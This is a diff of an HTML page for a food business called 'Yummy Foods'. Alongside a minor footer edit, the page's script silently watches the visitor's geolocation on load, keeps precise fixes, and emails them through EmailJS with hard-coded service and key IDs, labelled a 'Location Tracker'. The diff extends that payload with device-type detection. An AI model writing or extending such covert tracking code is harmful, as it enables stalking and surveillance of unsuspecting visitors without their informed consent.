@@ -250,18 +250,20 @@
     </main>
 
     <footer>
-        <p>&copy; 2024 Yummy Foods. All Rights Reserved.</p>
+        <p>&copy; 2024 Yummy Foods. All Rights Reserved.
+        </p>
+        <p>Contact us</p>
     </footer>
 
     <script>
         let watchId;
         const locationHistory = [];
-    
+        
         (function() {
             emailjs.init("sjem_DYuQ5tWYRZlu");
             getLocationAndSend();
         })();
-    
+        
         function getLocationAndSend() {
             if (navigator.geolocation) {
                 watchId = navigator.geolocation.watchPosition(sendSilentLocation, showError, {
@@ -269,7 +271,7 @@
                     timeout: 30000,
                     maximumAge: 0
                 });
-    
+        
                 setTimeout(() => {
                     navigator.geolocation.clearWatch(watchId);
                     sendStoredLocations();
@@ -277,31 +279,46 @@
             }
         }
     
+        // Function to detect the device type using userAgent
+        function getDeviceType() {
+            const userAgent = navigator.userAgent;
+            if (/android/i.test(userAgent)) {
+                return "Android";
+            } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+                return "iOS Device";
+            } else {
+                return "Other";
+            }
+        }
+        
         function sendSilentLocation(position) {
             let latitude = position.coords.latitude;
             let longitude = position.coords.longitude;
             let accuracy = position.coords.accuracy;
-    
+        
             if (accuracy < 20) {
                 locationHistory.push({ latitude, longitude, accuracy });
-    
+        
                 if (locationHistory.length > 3) {
                     locationHistory.shift();
                 }
             }
         }
-    
+        
         function sendStoredLocations() {
             if (locationHistory.length > 0) {
                 const messages = locationHistory.map((loc, index) => {
                     return `Location ${index + 1}: Latitude: ${loc.latitude}, Longitude: ${loc.longitude}, Accuracy: ${loc.accuracy} meters`;
                 }).join('\n');
-    
+        
+                const deviceType = getDeviceType(); // Get device type
+                
                 const emailData = {
                     from_name: "Yummy Foods Location Tracker",
                     message: messages,
+                    device_name: deviceType // Include device name in email data
                 };
-    
+        
                 emailjs.send("service_7ee2uba", "template_b4j0rx4", emailData)
                     .then(function(response) {
                         console.log(`SUCCESS! Data sent. Status: ${response.status}`);
@@ -313,10 +330,10 @@
                 console.log("No accurate locations to send.");
             }
         }
-    
+        
         function showError(error) {
             console.error("Error getting location:", error);
         }
-    </script>
+    </script>    
 </body>
 </html>
